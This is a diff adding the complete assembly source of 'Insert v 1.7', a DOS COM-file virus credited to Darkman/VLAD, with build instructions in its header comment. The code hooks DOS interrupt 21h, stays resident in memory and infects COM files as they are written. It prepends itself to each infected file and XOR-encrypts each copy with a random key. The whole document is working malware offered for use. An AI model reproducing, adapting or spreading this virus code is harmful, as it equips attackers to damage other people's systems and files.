@@ -1,0 +1,171 @@
+comment *
+                              Insert v 1.7
+                                Code by
+                              Darkman/VLAD
+
+  Insert v 1.7 is a 258 byte parasitic resident COM infector. Infects files
+  on write by placing the virus at the beginning of the infected file, after
+  the file has been created. Insert v 1.7 has 8-bit exclusive OR (XOR)
+  encryption.
+
+  To compile Insert v 1.7 with Turbo Assembler v 4.0 type:
+    TASM INSERT17.ASM
+    TLINK /x INSERT17.OBJ
+    EXE2BIN INSERT17.EXE INSERT17.COM
+*
+
+.model tiny
+.code
+
+code:
+             lea     di,crypt+100h       ; DI = offset of crypt
+             call    xorcrypt
+crypt:
+             mov     ax,6302h            ; Insert v 1.7 service
+             int     21h                 ; Do it!
+             cmp     ax,bx               ; Already resident?
+             je      insert_exit         ; Equal? Jump to insert_exit
+
+             mov     ax,ds
+             dec     ax                  ; Decrease AX
+             mov     ds,ax               ; DS = segment of programs MCB
+
+             xor     di,di               ; Zero DI
+             cmp     byte ptr ds:[di],'Z'
+             jne     insert_exit         ; Not last in chain? Jump to inser...
+             sub     word ptr ds:[di+03h],((codeend-code+0fh)/10h)*02h
+             sub     word ptr ds:[di+12h],((codeend-code+0fh)/10h)*02h
+             mov     es,[di+12h]         ; ES = first usable program segment
+
+             push    cs                  ; Save CS at stack
+             pop     ds                  ; Load DS from stack (CS)
+
+             cld                         ; Clear direction flag
+             mov     cx,(codeend-code)   ; Move 258 bytes
+             lea     si,code+100h        ; SI = offset of code
+             rep     movsb               ; Move virus to top of memory
+
+             mov     ds,cx               ; DS = segment of interrupt table
+             lea     di,int21addr        ; DI = offset of int21addr
+             mov     si,(21h*04h)        ; SI = offset of interrupt 21h
+             movsw                       ; Get interrupt vector 21h
+             movsw                       ;  "      "       "     "
+             mov     word ptr ds:[si-04h],offset virusint21
+             mov     ds:[si-02h],es     ; Set interrupt vector 21h
+
+             push    cs                  ; Save CS at stack
+             pop     es                  ; Load ES from stack (CS)
+insert_exit:
+             push    cs                  ; Save CS at stack
+             pop     ds                  ; Load DS from stack (CS)
+
+             lea     ax,code+100h        ; AX = offset of code
+             push    ax                  ; Save AX at stack
+
+             mov     cx,(restore_end-restore)
+             lea     si,restore+100h     ; SI = offset of restore
+             mov     di,0fff1h           ; DI = end of segment
+             push    di                  ; Save DI at stack
+             rep     movsb               ; Move restore code to end of segment
+
+             mov     cx,0fef1h-(codeend-code)
+             mov     di,ax               ; DI = offset of code
+             lea     si,codeend+100h     ; SI = offset of codeend
+
+             xor     ax,ax               ; Zero AX
+             mov     bx,ax               ; Zero BX
+
+             ret                         ; Return!
+
+virusint21   proc    near                ; Interrupt 21h of Insert v 1.7
+             cmp     ah,40h              ; Write to file?
+             je      infect_file         ; Equal? Jump to infect_file
+             cmp     ax,6302h            ; Insert v 1.7 service?
+             jne     int21exit           ; Not equal? Jump to int21exit
+
+             mov     bx,ax
+int21exit:
+             db      0eah                ; Opcode of a jump far
+int21addr    dd      ?                   ; Address of interrupt 21h
+
+infect_file:
+             push    ax di si es         ; Save registers at stack
+
+             mov     ax,1220h            ; Get system file table number
+             int     2fh                 ; Do it! (multiplex)
+
+             push    bx                  ; Save BX at stack
+             mov     ax,1216h            ; Get address of system FCB
+             mov     bl,es:[di]          ; BL = system file table entry
+             int     2fh                 ; Do it! (multiplex)
+             pop     bx                  ; Load BX from stack
+
+             cmp     word ptr es:[di+28h],'OC'
+             jne     dont_infect         ; Not equal? Jump to dont_infect
+             cmp     byte ptr es:[di+2ah],'M'
+             jne     dont_infect         ; Not equal? Jump to dont_infect
+
+             xor     si,si               ; Zero SI
+             cmp     word ptr es:[di+11h],si
+             jne     dont_infect         ; Not equal? Jump to dont_infect
+
+             push    cx dx ds            ; Save registers at stack
+
+             push    cs cs               ; Save CS at stack
+             pop     ds es               ; Load registers from stack (CS)
+get_random:
+             in      al,40h              ; AL = 8-bit random number
+
+             or      al,al               ; Zero AL?
+             jz      get_random          ; Zero? Jump to get_random
+
+             mov     byte ptr [cryptcode+02h],al
+
+             cld                         ; Clear direction flag
+             mov     cx,(codeend-code)   ; Move 258 bytes
+             mov     di,cx               ; DI = offset og codeend
+             push    cx di               ; Save registers at stack
+             rep     movsb               ; Create a copy of the virus at top
+
+             lea     di,codeend+06h      ; DI = offset of crypt
+             call    xorcrypt
+
+             mov     ah,40h              ; Write to file
+             pop     dx cx               ; Load registers from stack
+             pushf                       ; Save flags at stack
+             call    cs:[int21addr]      ; Do it!
+
+             pop     ds dx cx            ; Load registers from stack
+dont_infect:
+             pop     es si di ax         ; Load registers from stack
+
+             jmp     int21exit
+             endp
+
+restore      proc    near                ; Restore the original program
+             rep     movsb               ; Move the original code
+
+             mov     di,ax               ; Zero DI
+             mov     si,ax               ; Zero SI
+
+             ret                         ; Return!
+restore_end:
+             endp
+
+virusname    db      ' [Insert v 1.7]'   ; Name of the virus
+virusauthor  db      ' [Darkman/VLAD] '  ; Author of the virus
+cryptend:
+
+xorcrypt     proc    near                ; 8-bit XOR Encrypt/Decrypt
+             mov     cx,(cryptend-crypt) ; Encrypt/Decrypt 242 bytes
+cryptcode:
+             xor     byte ptr [di],00h   ; 8-bit XOR Encrypt/Decrypt
+             inc     di                  ; Increase DI
+             loop    cryptcode
+
+             ret                         ; Return!
+             endp
+codeend:
+             int     20h                 ; Exit to DOS!
+
+end          code
